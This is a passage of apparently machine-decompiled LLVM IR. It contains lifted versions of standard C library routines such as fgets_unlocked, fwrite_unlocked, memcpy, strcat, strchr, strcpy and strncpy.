  uselistorder label %dec_label_pc_80525fe, { 1, 0 }
  uselistorder label %dec_label_pc_80525d1, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8052694 = load i32, i32* @ebp, align 4
  %v4_805269f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805269f, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_805269f, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_80526e5.preheader, label %dec_label_pc_80526f1

dec_label_pc_80526e5.preheader:                   ; preds = %entry
  %v1_80526e519 = add i32 %arg2, -1
  %v8_80526e523 = icmp eq i32 %v1_80526e519, 0
  store i32 %v1_80526e519, i32* @esi, align 4
  %v1_80526e625 = icmp eq i1 %v8_80526e523, false
  br i1 %v1_80526e625, label %dec_label_pc_80526af, label %dec_label_pc_80526e8

dec_label_pc_80526af:                             ; preds = %dec_label_pc_80526e5.preheader, %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge.dec_label_pc_80526af_crit_edge
  %v0_80526af = phi i32 [ %v0_80526af.pre, %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge.dec_label_pc_80526af_crit_edge ], [ %arg3, %dec_label_pc_80526e5.preheader ]
  %v1_80526af = add i32 %v0_80526af, 16
  %v2_80526af = inttoptr i32 %v1_80526af to i32*
  %v3_80526af = load i32, i32* %v2_80526af, align 4
  store i32 %v3_80526af, i32* %eax.global-to-local, align 4
  %v2_80526b2 = add i32 %v0_80526af, 24
  %v3_80526b2 = inttoptr i32 %v2_80526b2 to i32*
  %v4_80526b2 = load i32, i32* %v3_80526b2, align 4
  %v10_80526b2 = icmp ult i32 %v3_80526af, %v4_80526b2
  %v1_80526b5 = icmp eq i1 %v10_80526b2, false
  br i1 %v1_80526b5, label %dec_label_pc_80526c5, label %dec_label_pc_80526b7

dec_label_pc_80526b7:                             ; preds = %dec_label_pc_80526af
  %v1_80526b7 = inttoptr i32 %v3_80526af to i8*
  %v2_80526b7 = load i8, i8* %v1_80526b7, align 1
  %v3_80526b7 = zext i8 %v2_80526b7 to i32
  %v4_80526b7 = load i32, i32* @edx, align 4
  %v5_80526b7 = and i32 %v4_80526b7, -256
  %v6_80526b7 = or i32 %v5_80526b7, %v3_80526b7
  store i32 %v6_80526b7, i32* @edx, align 4
  %v1_80526b9 = add i32 %v3_80526af, 1
  store i32 %v1_80526b9, i32* %eax.global-to-local, align 4
  %v2_80526ba = load i32, i32* @ebx, align 4
  %v3_80526ba = inttoptr i32 %v2_80526ba to i8*
  store i8 %v2_80526b7, i8* %v3_80526ba, align 1
  %v0_80526bc = load i32, i32* @ebx, align 4
  %v1_80526bc = add i32 %v0_80526bc, 1
  store i32 %v1_80526bc, i32* @ebx, align 4
  %v0_80526bd = load i32, i32* @edx, align 4
  %v1_80526bd = trunc i32 %v0_80526bd to i8
  %v10_80526bd = icmp eq i8 %v1_80526bd, 10
  %v0_80526c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80526c0 = load i32, i32* @ebp, align 4
  %v2_80526c0 = add i32 %v1_80526c0, 16
  %v3_80526c0 = inttoptr i32 %v2_80526c0 to i32*
  store i32 %v0_80526c0, i32* %v3_80526c0, align 4
  br i1 %v10_80526bd, label %dec_label_pc_80526e8, label %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge

dec_label_pc_80526c5:                             ; preds = %dec_label_pc_80526af
  %v0_80526c9 = call i32 @getc_unlocked()
  %v1_80526c9 = trunc i32 %v0_80526c9 to i8
  store i32 %v0_80526c9, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_80526c9, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_80526d4 = icmp eq i1 %tmp, false
  br i1 %v1_80526d4, label %dec_label_pc_80526e3, label %dec_label_pc_80526d6

dec_label_pc_80526d6:                             ; preds = %dec_label_pc_80526c5
  %v0_80526d6 = load i32, i32* @ebp, align 4
  %v1_80526d6 = inttoptr i32 %v0_80526d6 to i8*
  %v2_80526d6 = load i8, i8* %v1_80526d6, align 1
  %v3_80526d6 = and i8 %v2_80526d6, 8
  %v4_80526d6 = icmp eq i8 %v3_80526d6, 0
  br i1 %v4_80526d6, label %dec_label_pc_80526e8, label %dec_label_pc_80526f1

dec_label_pc_80526e3:                             ; preds = %dec_label_pc_80526c5
  %v3_80526de = load i32, i32* @ebx, align 4
  %v4_80526de = inttoptr i32 %v3_80526de to i8*
  store i8 %v1_80526c9, i8* %v4_80526de, align 1
  %v0_80526e0 = load i32, i32* @ebx, align 4
  %v1_80526e0 = add i32 %v0_80526e0, 1
  store i32 %v1_80526e0, i32* @ebx, align 4
  %v11_80526e1 = icmp eq i8 %v1_80526c9, 10
  br i1 %v11_80526e1, label %dec_label_pc_80526e8, label %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge

dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge: ; preds = %dec_label_pc_80526b7, %dec_label_pc_80526e3
  %v0_80526e5.pre = load i32, i32* @esi, align 4
  %v1_80526e5 = add i32 %v0_80526e5.pre, -1
  %v8_80526e5 = icmp eq i32 %v1_80526e5, 0
  store i32 %v1_80526e5, i32* @esi, align 4
  %v1_80526e6 = icmp eq i1 %v8_80526e5, false
  br i1 %v1_80526e6, label %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge.dec_label_pc_80526af_crit_edge, label %dec_label_pc_80526e8

dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge.dec_label_pc_80526af_crit_edge: ; preds = %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge
  %v0_80526af.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80526af

dec_label_pc_80526e8:                             ; preds = %dec_label_pc_80526e5.preheader, %dec_label_pc_80526b7, %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge, %dec_label_pc_80526e3, %dec_label_pc_80526d6
  %v0_80526e8 = load i32, i32* @ebx, align 4
  %v1_80526e8 = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_80526e8, %v1_80526e8
  br i1 %tmp27, label %dec_label_pc_80526ec, label %dec_label_pc_80526f1

dec_label_pc_80526ec:                             ; preds = %dec_label_pc_80526e8
  %v1_80526ec = inttoptr i32 %v0_80526e8 to i8*
  store i8 0, i8* %v1_80526ec, align 1
  %v0_80526f6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80526f3

dec_label_pc_80526f1:                             ; preds = %dec_label_pc_80526e8, %dec_label_pc_80526d6, %entry
  br label %dec_label_pc_80526f3

dec_label_pc_80526f3:                             ; preds = %dec_label_pc_80526ec, %dec_label_pc_80526f1
  %v0_80526f6 = phi i32 [ %v0_80526f6.pre, %dec_label_pc_80526ec ], [ 0, %dec_label_pc_80526f1 ]
  store i32 %v0_80526f6, i32* %eax.global-to-local, align 4
  store i32 %v0_8052694, i32* @ebp, align 4
  ret i32 %v0_80526f6

; uselistorder directives
  uselistorder i32 %v0_80526f6, { 1, 0 }
  uselistorder i32 %v0_80526e8, { 1, 0 }
  uselistorder i32 %v1_80526e5, { 1, 0 }
  uselistorder i32 %v0_80526c9, { 0, 2, 1 }
  uselistorder i32 %v0_80526af, { 1, 0 }
  uselistorder label %dec_label_pc_80526f3, { 1, 0 }
  uselistorder label %dec_label_pc_80526e8, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_80526e3.dec_label_pc_80526e5_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80526af, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8052700 = load i32, i32* @esi, align 4
  %v0_8052701 = load i32, i32* @ebx, align 4
  store i32 %v0_8052701, i32* %stack_var_-8, align 4
  %v4_8052705 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052705, i32* @ebx, align 4
  %v3_805270a = call i32 @strlen(i8* %arg1)
  store i32 %v3_805270a, i32* @esi, align 4
  %v0_805271b = load i32, i32* @ebx, align 4
  %v6_805271c = call i32 @__GI_fwrite_unlocked(i32 %v0_805271b, i64 1, i32 %v3_805270a, i32 %arg2)
  %v1_8052726 = load i32, i32* @esi, align 4
  %v12_8052726 = icmp eq i32 %v6_805271c, %v1_8052726
  %v3_8052728 = select i1 %v12_8052726, i32 %v6_805271c, i32 -1
  %v2_805272e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805272e, i32* @ebx, align 4
  store i32 %v0_8052700, i32* @esi, align 4
  ret i32 %v3_8052728

; uselistorder directives
  uselistorder i32 %v6_805271c, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8052734 = load i32, i32* @edi, align 4
  %v0_8052735 = load i32, i32* @esi, align 4
  %v0_8052736 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_805273b = trunc i64 %arg2 to i32
  store i32 %v4_805273b, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8052743 = inttoptr i32 %arg4 to i16*
  %v2_8052743 = load i16, i16* %v1_8052743, align 2
  %v1_8052746 = and i16 %v2_8052743, 192
  %v6_805274b = icmp eq i16 %v1_8052746, 192
  br i1 %v6_805274b, label %dec_label_pc_8052766, label %dec_label_pc_8052752

dec_label_pc_8052752:                             ; preds = %entry
  %v0_8052752 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_805275a = call i32 @__stdio_trans2w_o(i16* %v1_8052743, i32 128, i32 %v0_8052752, i32 %v0_8052752, i32 %v0_8052736, i32 %v0_8052735, i32 %v0_8052734)
  %v1_8052762 = icmp eq i32 %v9_805275a, 0
  %v1_8052764 = icmp eq i1 %v1_8052762, false
  br i1 %v1_8052764, label %dec_label_pc_80527a6, label %dec_label_pc_8052766

dec_label_pc_8052766:                             ; preds = %dec_label_pc_8052752, %entry
  %v2_8052766 = icmp eq i32 %v4_805273b, 0
  br i1 %v2_8052766, label %dec_label_pc_80527a6, label %dec_label_pc_805276a

dec_label_pc_805276a:                             ; preds = %dec_label_pc_8052766
  %v1_805276a = icmp eq i32 %arg3, 0
  br i1 %v1_805276a, label %dec_label_pc_80527a6, label %dec_label_pc_805276e

dec_label_pc_805276e:                             ; preds = %dec_label_pc_805276a
  %v9_8052773 = udiv i64 4294967295, %arg2
  %v10_8052773 = trunc i64 %v9_8052773 to i32
  %v6_8052777 = icmp ult i32 %v10_8052773, %arg3
  br i1 %v6_8052777, label %dec_label_pc_8052793, label %dec_label_pc_8052779

dec_label_pc_8052779:                             ; preds = %dec_label_pc_805276e
  %sext = mul i64 %arg2, 4294967296
  %v2_805277c = sdiv i64 %sext, 4294967296
  %v3_805277c = sext i32 %arg3 to i64
  %v4_805277c = mul nsw i64 %v3_805277c, %v2_805277c
  %v5_805277c = trunc i64 %v4_805277c to i32
  %v0_805277f = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8052785 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_805277c, i32 %v0_805277f, i32 %v10_8052773)
  %v6_8052785 = sext i32 %v5_8052785 to i64
  %v10_805278f = udiv i64 %v6_8052785, %arg2
  %v11_805278f = trunc i64 %v10_805278f to i32
  br label %dec_label_pc_80527a8

dec_label_pc_8052793:                             ; preds = %dec_label_pc_805276e
  %v0_8052793 = load i32, i32* @ebx, align 4
  %v1_8052793 = inttoptr i32 %v0_8052793 to i32*
  %v2_8052793 = load i32, i32* %v1_8052793, align 4
  %v1_8052795 = or i32 %v2_8052793, 8
  %v1_8052798 = trunc i32 %v1_8052795 to i16
  %v3_8052798 = inttoptr i32 %v0_8052793 to i16*
  store i16 %v1_8052798, i16* %v3_8052798, align 2
  %v0_805279b = load i32, i32* %stack_var_-28, align 4
  %v1_805279b = call i32 @__errno_location(i32 %v0_805279b)
  %v1_80527a0 = inttoptr i32 %v1_805279b to i32*
  store i32 22, i32* %v1_80527a0, align 4
  br label %dec_label_pc_80527a6

dec_label_pc_80527a6:                             ; preds = %dec_label_pc_805276a, %dec_label_pc_8052766, %dec_label_pc_8052752, %dec_label_pc_8052793
  br label %dec_label_pc_80527a8

dec_label_pc_80527a8:                             ; preds = %dec_label_pc_8052779, %dec_label_pc_80527a6
  %v0_80527ab = phi i32 [ %v11_805278f, %dec_label_pc_8052779 ], [ 0, %dec_label_pc_80527a6 ]
  store i32 %v0_8052735, i32* @esi, align 4
  store i32 %v0_8052734, i32* @edi, align 4
  ret i32 %v0_80527ab

; uselistorder directives
  uselistorder i32 %v0_8052752, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80527a8, { 1, 0 }
  uselistorder label %dec_label_pc_80527a6, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80527ad = load i32, i32* @esi, align 4
  store i32 %v0_80527ad, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80527ae = sdiv i32 %sext, 16777216
  store i32 %v4_80527ae, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80527b6 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80527b6, i32* %edi.global-to-local, align 4
  %v2_80527bc = udiv i32 %v4_80527ae, 4
  %v3_80527bf = inttoptr i32 %arg2 to i8*
  %v4_80527bf = bitcast i16* %arg1 to i8*
  %v5_80527bf = call i8* @_memcpy(i8* %v4_80527bf, i8* %v3_80527bf, i32 %v2_80527bc)
  %v6_80527bf = ptrtoint i8* %v5_80527bf to i32
  store i32 %v6_80527bf, i32* @ecx, align 4
  %v0_80527c1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80527c1 = and i32 %v0_80527c1, 2
  %v3_80527c1 = icmp eq i32 %v2_80527c1, 0
  br i1 %v3_80527c1, label %dec_label_pc_80527c7, label %dec_label_pc_80527c5

dec_label_pc_80527c5:                             ; preds = %entry
  %v0_80527c5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80527c5 = inttoptr i32 %v0_80527c5 to i16*
  %v2_80527c5 = load i16, i16* %v1_80527c5, align 2
  %v3_80527c5 = load i32, i32* %edi.global-to-local, align 4
  %v4_80527c5 = inttoptr i32 %v3_80527c5 to i16*
  store i16 %v2_80527c5, i16* %v4_80527c5, align 2
  %v5_80527c5 = load i32, i32* %edi.global-to-local, align 4
  %v6_80527c5 = load i32, i32* %esi.global-to-local, align 4
  %v7_80527c5 = load i1, i1* @df, align 1
  %v8_80527c5 = select i1 %v7_80527c5, i32 -2, i32 2
  %v9_80527c5 = add i32 %v8_80527c5, %v5_80527c5
  %v10_80527c5 = add i32 %v8_80527c5, %v6_80527c5
  store i32 %v9_80527c5, i32* %edi.global-to-local, align 4
  store i32 %v10_80527c5, i32* %esi.global-to-local, align 4
  %v0_80527c7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527c7

dec_label_pc_80527c7:                             ; preds = %entry, %dec_label_pc_80527c5
  %v0_80527c7 = phi i32 [ %v0_80527c1, %entry ], [ %v0_80527c7.pre, %dec_label_pc_80527c5 ]
  %v2_80527c7 = urem i32 %v0_80527c7, 2
  %v3_80527c7 = icmp eq i32 %v2_80527c7, 0
  br i1 %v3_80527c7, label %dec_label_pc_80527cc, label %dec_label_pc_80527cb

dec_label_pc_80527cb:                             ; preds = %dec_label_pc_80527c7
  %v0_80527cb = load i32, i32* %esi.global-to-local, align 4
  %v1_80527cb = inttoptr i32 %v0_80527cb to i8*
  %v2_80527cb = load i8, i8* %v1_80527cb, align 1
  %v3_80527cb = load i32, i32* %edi.global-to-local, align 4
  %v4_80527cb = inttoptr i32 %v3_80527cb to i8*
  store i8 %v2_80527cb, i8* %v4_80527cb, align 1
  %v5_80527cb = load i32, i32* %edi.global-to-local, align 4
  %v6_80527cb = load i32, i32* %esi.global-to-local, align 4
  %v7_80527cb = load i1, i1* @df, align 1
  %v8_80527cb = select i1 %v7_80527cb, i32 -1, i32 1
  %v9_80527cb = add i32 %v8_80527cb, %v5_80527cb
  %v10_80527cb = add i32 %v8_80527cb, %v6_80527cb
  store i32 %v9_80527cb, i32* %edi.global-to-local, align 4
  store i32 %v10_80527cb, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80527cc

dec_label_pc_80527cc:                             ; preds = %dec_label_pc_80527c7, %dec_label_pc_80527cb
  store i32 %v4_80527b6, i32* %eax.global-to-local, align 4
  %v2_80527d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80527d0, i32* @esi, align 4
  ret i32 %v4_80527b6

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_80527cc, { 1, 0 }
  uselistorder label %dec_label_pc_80527c7, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_80527d4 = load i32, i32* @edi, align 4
  %v4_80527dd = ptrtoint i8* %arg1 to i32
  %v5_80527e1 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_80527e1 = ptrtoint i8* %v5_80527e1 to i32
  store i32 %v6_80527e1, i32* @ecx, align 4
  store i32 %v0_80527d4, i32* @edi, align 4
  ret i32 %v4_80527dd

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80527ef = load i32, i32* @esi, align 4
  store i32 %v0_80527ef, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80527f7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80527f7, i32* %edi.global-to-local, align 4
  %v3_80527fb = call i32 @_strlen(i8* %arg1)
  %v2_80527fd = add i32 %v4_80527f7, -1
  store i32 %v2_80527fd, i32* %edi.global-to-local, align 4
  %v4_80527fe.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_80527fe.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80527fe

dec_label_pc_80527fe:                             ; preds = %dec_label_pc_80527fe, %entry
  %v2_80527ff = phi i32 [ %v7_80527ff, %dec_label_pc_80527fe ], [ %v2_80527fd, %entry ]
  %v8_80527fe = phi i1 [ %v5_80527ff, %dec_label_pc_80527fe ], [ %v8_80527fe.pre, %entry ]
  %v4_80527fe = phi i32 [ %v0_8052800, %dec_label_pc_80527fe ], [ %v4_80527fe.pre, %entry ]
  %v0_80527fe = load i32, i32* %esi.global-to-local, align 4
  %v1_80527fe = inttoptr i32 %v0_80527fe to i8*
  %v2_80527fe = load i8, i8* %v1_80527fe, align 1
  %v3_80527fe = zext i8 %v2_80527fe to i32
  %v5_80527fe = and i32 %v4_80527fe, -256
  %v6_80527fe = or i32 %v3_80527fe, %v5_80527fe
  store i32 %v6_80527fe, i32* %eax.global-to-local, align 4
  %v9_80527fe = select i1 %v8_80527fe, i32 -1, i32 1
  %v10_80527fe = add i32 %v0_80527fe, %v9_80527fe
  store i32 %v10_80527fe, i32* %esi.global-to-local, align 4
  %v3_80527ff = inttoptr i32 %v2_80527ff to i8*
  store i8 %v2_80527fe, i8* %v3_80527ff, align 1
  %v4_80527ff = load i32, i32* %edi.global-to-local, align 4
  %v5_80527ff = load i1, i1* @df, align 1
  %v6_80527ff = select i1 %v5_80527ff, i32 -1, i32 1
  %v7_80527ff = add i32 %v6_80527ff, %v4_80527ff
  store i32 %v7_80527ff, i32* %edi.global-to-local, align 4
  %v0_8052800 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052800 = trunc i32 %v0_8052800 to i8
  %v4_8052800 = icmp eq i8 %v3_8052800, 0
  %v1_8052802 = icmp eq i1 %v4_8052800, false
  br i1 %v1_8052802, label %dec_label_pc_80527fe, label %dec_label_pc_8052804

dec_label_pc_8052804:                             ; preds = %dec_label_pc_80527fe
  store i32 %v4_80527f7, i32* %eax.global-to-local, align 4
  %v2_8052808 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052808, i32* @esi, align 4
  ret i32 %v4_80527f7

; uselistorder directives
  uselistorder i32 %v0_8052800, { 1, 0 }
  uselistorder i32 %v7_80527ff, { 1, 0 }
  uselistorder i1 %v5_80527ff, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805280d = ptrtoint i8* %arg1 to i32
  %v2_8052815 = mul i32 %arg2, 256
  %v3_8052815 = and i32 %v2_8052815, 65280
  %v4_8052815 = and i32 %arg2, -65281
  %v5_8052815 = or i32 %v3_8052815, %v4_8052815
  %v8_8052817.pre = load i1, i1* @df, align 1
  %v9_8052817 = select i1 %v8_8052817.pre, i32 -1, i32 1
  br label %dec_label_pc_8052817

dec_label_pc_8052817:                             ; preds = %dec_label_pc_805281c, %entry
  %v4_8052817 = phi i32 [ %v6_8052817, %dec_label_pc_805281c ], [ %v5_8052815, %entry ]
  %v7_8052817 = phi i32 [ %v10_8052817, %dec_label_pc_805281c ], [ %v4_805280d, %entry ]
  %v1_8052817 = inttoptr i32 %v7_8052817 to i8*
  %v2_8052817 = load i8, i8* %v1_8052817, align 1
  %v10_8052817 = add i32 %v7_8052817, %v9_8052817
  %v3_8052818 = udiv i32 %v4_8052817, 256
  %v4_8052818 = trunc i32 %v3_8052818 to i8
  %v16_8052818 = icmp eq i8 %v2_8052817, %v4_8052818
  br i1 %v16_8052818, label %dec_label_pc_8052825, label %dec_label_pc_805281c

dec_label_pc_805281c:                             ; preds = %dec_label_pc_8052817
  %v3_8052817 = zext i8 %v2_8052817 to i32
  %v5_8052817 = and i32 %v4_8052817, -256
  %v6_8052817 = or i32 %v3_8052817, %v5_8052817
  %v4_805281c = icmp eq i8 %v2_8052817, 0
  %v1_805281e = icmp eq i1 %v4_805281c, false
  br i1 %v1_805281e, label %dec_label_pc_8052817, label %dec_label_pc_8052820

dec_label_pc_8052820:                             ; preds = %dec_label_pc_805281c
  br label %dec_label_pc_8052825

dec_label_pc_8052825:                             ; preds = %dec_label_pc_8052817, %dec_label_pc_8052820
  %v0_8052825 = phi i32 [ 1, %dec_label_pc_8052820 ], [ %v10_8052817, %dec_label_pc_8052817 ]
  %v1_8052827 = add i32 %v0_8052825, -1
  ret i32 %v1_8052827

; uselistorder directives
  uselistorder i8 %v2_8052817, { 1, 2, 0 }
  uselistorder i32 %v4_8052817, { 1, 0 }
  uselistorder i32 -65281, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052825, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805282d = load i32, i32* @esi, align 4
  store i32 %v0_805282d, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052835 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052835, i32* %edi.global-to-local, align 4
  %v4_8052839.pre = load i32, i32* @eax, align 4
  %v8_8052839.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8052839

dec_label_pc_8052839:                             ; preds = %dec_label_pc_8052839.dec_label_pc_8052839_crit_edge, %entry
  %v2_805283a = phi i32 [ %v7_805283a, %dec_label_pc_8052839.dec_label_pc_8052839_crit_edge ], [ %v4_8052835, %entry ]
  %v8_8052839 = phi i1 [ %v5_805283a, %dec_label_pc_8052839.dec_label_pc_8052839_crit_edge ], [ %v8_8052839.pre, %entry ]
  %v4_8052839 = phi i32 [ %v0_805283b, %dec_label_pc_8052839.dec_label_pc_8052839_crit_edge ], [ %v4_8052839.pre, %entry ]
  %v7_8052839 = phi i32 [ %v0_8052839.pre, %dec_label_pc_8052839.dec_label_pc_8052839_crit_edge ], [ %arg2, %entry ]
  %v1_8052839 = inttoptr i32 %v7_8052839 to i8*
  %v2_8052839 = load i8, i8* %v1_8052839, align 1
  %v3_8052839 = zext i8 %v2_8052839 to i32
  %v5_8052839 = and i32 %v4_8052839, -256
  %v6_8052839 = or i32 %v3_8052839, %v5_8052839
  store i32 %v6_8052839, i32* %eax.global-to-local, align 4
  %v9_8052839 = select i1 %v8_8052839, i32 -1, i32 1
  %v10_8052839 = add i32 %v7_8052839, %v9_8052839
  store i32 %v10_8052839, i32* %esi.global-to-local, align 4
  %v3_805283a = inttoptr i32 %v2_805283a to i8*
  store i8 %v2_8052839, i8* %v3_805283a, align 1
  %v4_805283a = load i32, i32* %edi.global-to-local, align 4
  %v5_805283a = load i1, i1* @df, align 1
  %v6_805283a = select i1 %v5_805283a, i32 -1, i32 1
  %v7_805283a = add i32 %v6_805283a, %v4_805283a
  store i32 %v7_805283a, i32* %edi.global-to-local, align 4
  %v0_805283b = load i32, i32* %eax.global-to-local, align 4
  %v3_805283b = trunc i32 %v0_805283b to i8
  %v4_805283b = icmp eq i8 %v3_805283b, 0
  %v1_805283d = icmp eq i1 %v4_805283b, false
  br i1 %v1_805283d, label %dec_label_pc_8052839.dec_label_pc_8052839_crit_edge, label %dec_label_pc_805283f

dec_label_pc_8052839.dec_label_pc_8052839_crit_edge: ; preds = %dec_label_pc_8052839
  %v0_8052839.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052839

dec_label_pc_805283f:                             ; preds = %dec_label_pc_8052839
  store i32 %v4_8052835, i32* %eax.global-to-local, align 4
  %v2_8052843 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052843, i32* @edx, align 4
  %v2_8052844 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052844, i32* @esi, align 4
  ret i32 %v4_8052835

; uselistorder directives
  uselistorder i32 %v0_805283b, { 1, 0 }
  uselistorder i32 %v7_805283a, { 1, 0 }
  uselistorder i1 %v5_805283a, { 1, 0 }
  uselistorder i32 %v4_8052835, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805285d = load i32, i32* @esi, align 4
  store i32 %v0_805285d, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052869 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052869, i32* %edi.global-to-local, align 4
  %v1_805286d = add i32 %arg3, 1
  store i32 %v1_805286d, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805286e

dec_label_pc_805286e:                             ; preds = %dec_label_pc_8052871, %entry
  %v3_8052872 = phi i32 [ %v4_8052869, %entry ], [ %v8_8052872, %dec_label_pc_8052871 ]
  %v0_805286e = phi i32 [ %v1_805286d, %entry ], [ %v0_805286e.pre, %dec_label_pc_8052871 ]
  %v1_805286e = add i32 %v0_805286e, -1
  %v8_805286e = icmp eq i32 %v1_805286e, 0
  store i32 %v1_805286e, i32* %ecx.global-to-local, align 4
  br i1 %v8_805286e, label %.loopexit, label %dec_label_pc_8052871

dec_label_pc_8052871:                             ; preds = %dec_label_pc_805286e
  %v0_8052871 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052871 = inttoptr i32 %v0_8052871 to i8*
  %v2_8052871 = load i8, i8* %v1_8052871, align 1
  %v10_8052871 = load i1, i1* @df, align 1
  %v11_8052871 = select i1 %v10_8052871, i32 -1, i32 1
  %v12_8052871 = add i32 %v11_8052871, %v0_8052871
  store i32 %v12_8052871, i32* %esi.global-to-local, align 4
  %v4_8052872 = inttoptr i32 %v3_8052872 to i8*
  store i8 %v2_8052871, i8* %v4_8052872, align 1
  %v5_8052872 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052872 = load i1, i1* @df, align 1
  %v7_8052872 = select i1 %v6_8052872, i32 -1, i32 1
  %v8_8052872 = add i32 %v7_8052872, %v5_8052872
  store i32 %v8_8052872, i32* %edi.global-to-local, align 4
  %v6_8052873 = icmp eq i8 %v2_8052871, 0
  %v1_8052875 = icmp eq i1 %v6_8052873, false
  %v0_805286e.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052875, label %dec_label_pc_805286e, label %dec_label_pc_8052877
